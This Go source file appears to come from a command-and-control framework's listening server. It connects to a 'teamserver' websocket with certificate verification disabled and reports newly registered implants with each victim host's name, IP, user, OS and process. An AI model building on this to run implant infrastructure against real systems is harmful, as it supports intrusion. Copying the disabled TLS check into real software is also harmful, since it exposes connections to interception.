package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"crypto/tls"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"strings"
)

func CreateWebSocketConnection() (*websocket.Conn, error) {

	var (
		token   []byte
		err     error
		headers http.Header
	)

	endpoint := "wss://" + g_clientobj.Server + "/ws"
	token, err = json.Marshal(g_clientobj.Cookie.Token.JwtToken)
	if err != nil {
		log.Println("[error] attempting to marshal JWT token")
		return nil, err
	}
	//set our request authorization header to be our jwt  token.
	headers = make(http.Header)
	headers.Set("Authorization", strings.Trim(string(token), "\""))
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	conn, _, err := websocket.DefaultDialer.Dial(endpoint, headers)
	if err != nil {
		log.Println("[error] attempting to make websocket connection", err)
		return nil, err
	}

	return conn, nil
}

func StartEventHandler(token string, teamserver string) error {
	var err error
	g_clientobj.Cookie.Token.JwtToken = token
	g_clientobj.Server = teamserver
	g_clientobj.Conn, err = CreateWebSocketConnection()
	if err != nil {
		log.Println("[error] attempting to create websocket connection", err)
		return err
	}
	return nil
}

func SendEvent(EventName string, data []byte) error {
	var NewMessage Common.NewWebSocketMessage
	var err error

	switch EventName {
	case "NewImplant":
		var NewImplant Common.ImplantData
		var ImpCtx Common.ImplantContext
		var TempData []byte
		NewMessage.MessageType = "NewImplant"
		err = ImpCtx.UnmarshalBinary(data)
		if err != nil {
			log.Println("[error] attempting to unmarshal implant data", err)
			return err
		}
		NewImplant.ImplantID = "First"
		NewImplant.Computer = ImpCtx.Host_name
		NewImplant.InternalIP = ImpCtx.Ip_addr
		NewImplant.ExternalIP = ImpCtx.Ip_addr
		NewImplant.User = ImpCtx.User_name
		NewImplant.Health = true
		NewImplant.OS = Common.GetWindowsVersion(ImpCtx.Os_info)
		NewImplant.Process = ImpCtx.Process_name
		NewImplant.PID = ImpCtx.Process_id
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		NewMessage.Message = string(TempData)
		err = g_clientobj.Conn.WriteJSON(NewMessage)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
			return err
		}
	}
	return nil
}